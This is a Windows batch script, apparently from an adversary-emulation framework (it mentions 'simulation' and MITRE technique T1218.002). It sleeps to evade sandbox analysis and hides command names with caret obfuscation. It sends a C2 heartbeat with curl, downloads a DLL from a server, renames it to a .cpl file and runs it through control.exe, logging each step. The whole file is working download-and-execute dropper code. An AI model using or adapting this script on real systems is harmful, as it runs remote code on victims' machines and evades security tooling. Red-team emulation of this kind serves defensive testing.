@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ placeholder assignments - NO obfuscation, NO quotes, NO spaces around =
SET yktnwwf=%APPDATA%\8250\d08fc9df
SET fpakbq=Macula-Stage0-8250
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8250-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=illustrator.txt
SET fpldhe=8250

REM Obfuscated strings for log file and temp dir
SET fupjynk=m^a^c^u^l^a^-^s^i^m^u^l^a^t^i^o^n^s^.^l^o^g
SET ixvlun=%APPDATA%\!yydue!
SET bwtnmk=!ixvlun!\!fupjynk!

REM Create directory structure if it doesn't exist
if not exist "!ixvlun!" mkdir "!ixvlun!" 2>nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: directory_created=!ixvlun!>>> "!bwtnmk!" 2>nul

REM Initial delay to evade sandbox analysis
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_start=45s>>> "!bwtnmk!" 2>nul
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_complete>>> "!bwtnmk!" 2>nul

REM TTP: T1218.002 - Control Panel Items execution
REM ==============================================

REM C2 HEARTBEAT (must be first operation) - FIXED implementation
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: c2_heartbeat_start>>> "!bwtnmk!" 2>nul
SET mzqwse=c^u^r^l
SET hbflags=-^k -^s -^o n^u^l
!mzqwse! !hbflags! "!rdzgrnne!"
if !errorlevel! EQU 0 (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: c2_heartbeat_success=!rdzgrnne!>>> "!bwtnmk!" 2>nul
    SET hb_result=1
    SET hb_detail=
) else (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: c2_heartbeat_failed=errorlevel_!errorlevel!>>> "!bwtnmk!" 2>nul
    SET hb_result=0
    SET hb_detail=curl_error_!errorlevel!
)

REM Only proceed if heartbeat succeeded
if !hb_result! EQU 1 (
    REM Delay between operations
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: inter_operation_delay_start=10s>>> "!bwtnmk!" 2>nul
    ping -n 10 127.0.0.1 >nul
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: inter_operation_delay_complete>>> "!bwtnmk!" 2>nul
    
    REM Create output directory if it doesn't exist
    if not exist "!yktnwwf!" mkdir "!yktnwwf!" 2>nul
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: output_dir_checked=!yktnwwf!>>> "!bwtnmk!" 2>nul
    
    REM Download DLL from external server (construct URL)
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: file_download_start>>> "!bwtnmk!" 2>nul
    SET xpntrym=!repbmqg!/download?file=!omxgazu!.dll&simulation=!fpldhe!
    SET ylcqkmn=!yktnwwf!\!edjwtl!
    SET dlflags=-^k -^s -^o
    !mzqwse! !dlflags! "!ylcqkmn!" "!xpntrym!"
    if !errorlevel! EQU 0 (
        echo [%DATE% %TIME%][DEBUG][!omxgazu!]: file_download_complete=!ylcqkmn!>>> "!bwtnmk!" 2>nul
    ) else (
        echo [%DATE% %TIME%][DEBUG][!omxgazu!]: file_download_failed=errorlevel_!errorlevel!>>> "!bwtnmk!" 2>nul
    )
    
    REM Verify download succeeded
    SET ttp_result=1
    SET err_detail=
    if not exist "!ylcqkmn!" (
        SET ttp_result=0
        SET err_detail=download_failed
        echo [%DATE% %TIME%][DEBUG][!omxgazu!]: file_download_missing=!ylcqkmn!>>> "!bwtnmk!" 2>nul
    )
    
    REM Delay before rename
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_pre_delay_start=8s>>> "!bwtnmk!" 2>nul
    CHOICE /C Y /N /D Y /T 8 >nul
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_pre_delay_complete>>> "!bwtnmk!" 2>nul
    
    REM Rename to .cpl extension
    if exist "!ylcqkmn!" (
        echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_start=!ylcqkmn!>>> "!bwtnmk!" 2>nul
        SET wztmf=f^i^l^e^.^c^p^l
        ren "!ylcqkmn!" "!wztmf!"
        SET jwqxch=!yktnwwf!\!wztmf!
        echo [%DATE% %TIME%][DEBUG][!omxgazu!]: rename_complete=!jwqxch!>>> "!bwtnmk!" 2>nul
    ) else (
        SET ttp_result=0
        SET err_detail=source_file_missing
    )
    
    REM Random delay before execution
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_start>>> "!bwtnmk!" 2>nul
    SET /A zjvpsn=%RANDOM% %% 20 + 10
    timeout /t !zjvpsn! /nobreak >nul
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_complete=!zjvpsn!s>>> "!bwtnmk!" 2>nul
    
    REM Execute Control.exe to load CPL file
    if exist "!jwqxch!" (
        echo [%DATE% %TIME%][DEBUG][!omxgazu!]: control_exe_execution_start>>> "!bwtnmk!" 2>nul
        SET lwvtxc=C^o^n^t^r^o^l^.^e^x^e
        !lwvtxc! "!jwqxch!"
        
        REM Check execution result
        if !errorlevel! NEQ 0 (
            SET ttp_result=0
            SET err_detail=control_exe_returned_!errorlevel!
            echo [%DATE% %TIME%][DEBUG][!omxgazu!]: control_exe_execution_failed=errorlevel_!errorlevel!>>> "!bwtnmk!" 2>nul
        ) else (
            echo [%DATE% %TIME%][DEBUG][!omxgazu!]: control_exe_execution_complete>>> "!bwtnmk!" 2>nul
        )
    ) else (
        SET ttp_result=0
        SET err_detail=cpl_file_missing
    )
    
    REM TTP logging with normalized timestamp
    FOR /F "tokens=1-3 delims=/ " %%a IN ("%DATE%") DO (
        SET norm_year=%%c
        SET norm_month=%%a
        SET norm_day=%%b
    )
    IF "!norm_month!" LSS "10" SET norm_month=0!norm_month!
    IF "!norm_day!" LSS "10" SET norm_day=0!norm_day!
    
    SET norm_time=%TIME: =0%
    SET norm_timestamp=!norm_year!-!norm_month!-!norm_day! !norm_time!
    
    SET ttp_log_line=[!norm_timestamp!][!omxgazu!]: !yydue!-!fpldhe!-T1218.002|Control Panel Items=!ttp_result!:!err_detail!
    echo !ttp_log_line!>> "!bwtnmk!" 2>nul
) else (
    REM Log heartbeat failure separately
    echo [%DATE% %TIME%][ERROR][!omxgazu!]: heartbeat_failed_aborting=!hb_detail!>>> "!bwtnmk!" 2>nul
)

REM Final delay before exit
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: final_delay_start=15s>>> "!bwtnmk!" 2>nul
timeout /t 15 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_complete>>> "!bwtnmk!" 2>nul

ENDLOCAL